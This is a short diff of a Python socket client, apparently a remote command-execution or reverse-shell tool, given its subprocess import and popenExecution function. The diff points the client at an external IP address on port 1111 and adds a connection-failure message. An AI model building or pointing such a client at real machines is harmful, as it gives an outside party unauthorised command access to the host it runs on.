@@ -5,7 +5,7 @@ import subprocess
 #||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||
 
 socket = socket.socket()
-serverAddress = '127.0.0.1', 1111
+serverAddress = '145.28.187.180', 1111
 
 
 def popenExecution(data):
@@ -29,6 +29,7 @@ def main():
             break
         except:
             socket.close()
+            print("Couldn't connect")
             break
 
 
